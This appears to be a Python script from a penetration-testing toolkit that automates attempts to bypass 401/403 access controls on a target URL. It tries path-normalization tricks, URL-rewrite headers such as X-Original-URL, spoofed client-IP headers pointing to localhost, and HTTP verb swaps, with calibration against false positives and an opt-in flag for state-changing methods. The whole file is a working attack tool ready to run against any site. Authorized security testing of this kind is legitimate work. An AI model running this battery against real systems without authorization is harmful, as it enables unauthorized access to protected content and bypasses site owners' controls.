#!/usr/bin/env python
"""forbidden_bypass.py — 401/403 access-control bypass battery (stdlib only).

Given a resource that returns 401/403 to a plain request, try the standard
attacker moves to reach the protected content ANYWAY, each compared against the
original deny as a built-in control (engagement-loop step 5). Four families:

  path    — path-normalization variants (/admin/, //admin, /%2e/, /admin..;/,
            case, .json/.html suffix, trailing dot/space) — a proxy/framework
            authz split where the ACL and the router normalize the path differently.
  rewrite — URL-rewrite headers (X-Original-URL / X-Rewrite-URL / X-Override-URL)
            sent to the origin ROOT pointing at the forbidden path (front-end ACL,
            back-end honors the header).
  ip      — client-IP-spoof headers (X-Forwarded-For / X-Real-IP / X-Client-IP /
            X-Originating-IP / True-Client-IP → 127.0.0.1|localhost) — an
            admin-only-from-localhost / internal-network ACL.
  verb    — verb swaps (HEAD/OPTIONS/TRACE + a bogus method by default; the
            state-changing POST/PUT/PATCH only with --allow-mutation, RoE) — an
            ACL that guards only GET.

FP discipline (pitfalls.md → WAF/challenge shell + soft-404): a "200" is only a
LEAD when its body LENGTH matches NEITHER the original deny NOR a known-nonexistent
sibling path — calibrated across TWO samples so a rotating nonce/CSRF token in a
catch-all page can't fabricate a bypass (an SPA/edge that 200s every path is
absorbed by the length band). A hit is still a LEAD, never confirmed — the verifier must confirm the
200 returns the PROTECTED content (not a login/redirect/shell). urllib normalizes
some exotic paths itself and is BLIND through a JS-challenge WAF — re-test hits
via the browser channel.

Usage: python forbidden_bypass.py <forbidden-url> [--probes path,rewrite,ip,verb]
        [--timeout 15]
"""
import argparse, json, os, sys
from urllib.parse import urlsplit, urlunsplit, quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _http import request  # noqa: E402
from _result import result  # noqa: E402

RANDOM_SEG = "redan-nx-9d3f1a"          # a path that should never exist -> the soft-404/shell baseline
RANDOM_SEG2 = "redan-nx-4b7e02"         # a SECOND nonexistent sibling -> measures per-request jitter
IP_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Client-IP", "X-Originating-IP",
              "True-Client-IP", "Client-IP", "X-Forwarded-Host"]
IP_VALUES = ["127.0.0.1", "localhost"]
REWRITE_HEADERS = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL"]
SAFE_VERBS = ["HEAD", "OPTIONS", "TRACE", "REDAN"]   # non-state-changing (REDAN = a bogus-method probe)
MUTATING_VERBS = ["POST", "PUT", "PATCH"]            # gated behind --allow-mutation (RoE non-destructive)


def _len_band(a, b, jitter):
    """True if body lengths a,b are 'the same page' — within the per-request jitter (a rotating
    nonce/CSRF token, measured from two samples) or a small floor. LENGTH, not exact bytes, so a
    nonce'd deny/shell page can't read as a bypass on every request (the single-snapshot FP)."""
    return abs(a - b) <= max(24, jitter * 3)


def _rebuild(parts, path=None, query=None):
    return urlunsplit((parts.scheme, parts.netloc,
                       parts.path if path is None else path,
                       parts.query if query is None else query, ""))


def _path_variants(parts):
    """(label, mutated-url) path-normalization candidates for parts.path."""
    p = parts.path or "/"
    segs = p.rstrip("/").split("/")
    last = segs[-1] if segs and segs[-1] else p.strip("/")
    variants = [
        ("trailing-slash", p.rstrip("/") + "/"),
        ("double-leading-slash", "/" + p),
        ("dot-slash", p.rstrip("/") + "/."),
        ("slash-dot-slash", p.rstrip("/") + "/./"),
        ("semicolon", p.rstrip("/") + ";/"),
        ("matrix-dotdot", p.rstrip("/") + "..;/"),
        ("encoded-slash", p.rstrip("/") + "%2f"),
        ("encoded-dot", "/%2e" + p),
        ("trailing-dot", p.rstrip("/") + "."),
        ("trailing-space", p.rstrip("/") + "%20"),
        ("suffix-json", p.rstrip("/") + ".json"),
        ("suffix-html", p.rstrip("/") + ".html"),
    ]
    if last and last.lower() != last.upper():   # a segment with letters -> case flip
        variants.append(("case-upper", p[: p.rfind(last)] + last.upper()))
    out = []
    seen = set()
    for label, newpath in variants:
        u = _rebuild(parts, path=newpath)
        if u not in seen and newpath != p:
            seen.add(u)
            out.append((label, u))
    return out


def _is_hit(r, denies):
    """A candidate bypass: transport OK, 2xx, non-empty body whose LENGTH matches no known
    deny/shell baseline. `denies` is a list of (length, jitter) pairs (the 403, the soft-404
    siblings, [+ the homepage for the rewrite family]); length-band, not exact-sha, so per-request
    nonce/CSRF jitter in an otherwise-identical deny page does not fabricate a bypass."""
    if r.error or not (200 <= r.status < 300) or not r.body:
        return False       # HEAD / empty / non-2xx -> not a body-hit
    n = len(r.body)
    return not any(_len_band(n, dl, dj) for dl, dj in denies)


def run(url, probes, timeout, allow_mutation=False):
    parts = urlsplit(url)
    base = request(url, timeout=timeout, allow_redirects=False)
    if base.error:
        return result("forbidden_bypass", url, ok=False, disposition="none",
                      verdict="unreachable", note=f"base request failed: {base.error}")
    # only meaningful against a resource that is actually denied
    if base.status not in (401, 403):
        return result("forbidden_bypass", url, ok=True, disposition="none",
                      signals=0, verdict=f"base status {base.status} is not 401/403",
                      note="nothing to bypass — point this at a resource that returns 401/403. "
                           "(A 404 means the path does not exist; a 200 means it is already open.)",
                      base_status=base.status)

    # soft-404 / catch-all-shell baseline: TWO distinct nonexistent siblings, so a per-request
    # nonce/CSRF jitter in a catch-all page is MEASURED (and absorbed by the length band) rather
    # than mistaken for a bypass — the single-snapshot exact-sha FP the calibration avoids.
    nxp = parts.path.rstrip("/") + "/"
    nx1 = request(_rebuild(parts, path=nxp + RANDOM_SEG), timeout=timeout, allow_redirects=False)
    nx2 = request(_rebuild(parts, path=nxp + RANDOM_SEG2), timeout=timeout, allow_redirects=False)
    nx_jit = abs(len(nx1.body) - len(nx2.body))
    common_deny = [(len(base.body), 0), (len(nx1.body), nx_jit), (len(nx2.body), nx_jit)]
    hits = []

    if "path" in probes:
        for label, u in _path_variants(parts):
            r = request(u, timeout=timeout, allow_redirects=False)
            if _is_hit(r, common_deny):
                hits.append({"family": "path", "variant": label, "target": u,
                             "status": r.status, "body_len": len(r.body)})

    if "rewrite" in probes:
        root = _rebuild(parts, path="/", query="")
        r1 = request(root, timeout=timeout, allow_redirects=False)
        r2 = request(root, timeout=timeout, allow_redirects=False)
        root_jit = abs(len(r1.body) - len(r2.body))
        deny = common_deny + [(len(r1.body), root_jit), (len(r2.body), root_jit)]
        for hname in REWRITE_HEADERS:
            r = request(root, headers={hname: parts.path}, timeout=timeout, allow_redirects=False)
            if _is_hit(r, deny):
                hits.append({"family": "rewrite", "variant": f"{hname}: {parts.path}",
                             "target": root, "status": r.status, "body_len": len(r.body)})

    if "ip" in probes:
        for hname in IP_HEADERS:
            for val in IP_VALUES:
                r = request(url, headers={hname: val}, timeout=timeout, allow_redirects=False)
                if _is_hit(r, common_deny):
                    hits.append({"family": "ip", "variant": f"{hname}: {val}",
                                 "target": url, "status": r.status, "body_len": len(r.body)})
                    break   # one spoof value is enough evidence per header

    if "verb" in probes:
        for verb in SAFE_VERBS + (MUTATING_VERBS if allow_mutation else []):
            r = request(url, method=verb, timeout=timeout, allow_redirects=False)
            # HEAD has no body; a 2xx flip vs the deny status is a weaker (status-only) lead
            if verb == "HEAD":
                if not r.error and 200 <= r.status < 300:
                    hits.append({"family": "verb", "variant": "HEAD", "target": url,
                                 "status": r.status, "body_len": 0, "status_only": True})
            elif _is_hit(r, common_deny):
                hits.append({"family": "verb", "variant": verb, "target": url,
                             "status": r.status, "body_len": len(r.body)})

    families = sorted({h["family"] for h in hits})
    return result(
        "forbidden_bypass", url, ok=True,
        disposition="lead" if hits else "none",
        signals=len(hits),
        verdict=(f"{len(hits)} candidate bypass(es) via {', '.join(families)}" if hits
                 else f"no bypass of the {base.status} on any variant"),
        results=hits,
        note=("LEAD — a 2xx here differs from the original deny AND a known-nonexistent path, "
              "but it is NOT confirmed until the verifier checks the 200 returns the PROTECTED "
              "content (not a login page / redirect / soft-404 / WAF shell). urllib normalizes "
              "some exotic paths and is blind through a JS-challenge WAF — re-test hits via the "
              "browser channel (pitfalls.md)." if hits
              else f"the {base.status} held across every path/rewrite/ip/verb variant."),
        base_status=base.status,
        **({"mutating_verbs_skipped": MUTATING_VERBS} if ("verb" in probes and not allow_mutation) else {}))


def main():
    ap = argparse.ArgumentParser(description="401/403 access-control bypass battery")
    ap.add_argument("url", help="a resource that returns 401/403")
    ap.add_argument("--probes", default="path,rewrite,ip,verb",
                    help="comma list of families to run (path,rewrite,ip,verb)")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--allow-mutation", action="store_true",
                    help="also send state-changing verbs (POST/PUT/PATCH) in the verb family — RoE: "
                         "needs mutation_testing: approved (the host hook can't see the in-.py verb)")
    a = ap.parse_args()
    print(json.dumps(run(a.url, set(x.strip() for x in a.probes.split(",") if x.strip()),
                         a.timeout, allow_mutation=a.allow_mutation), indent=2))


if __name__ == "__main__":
    main()
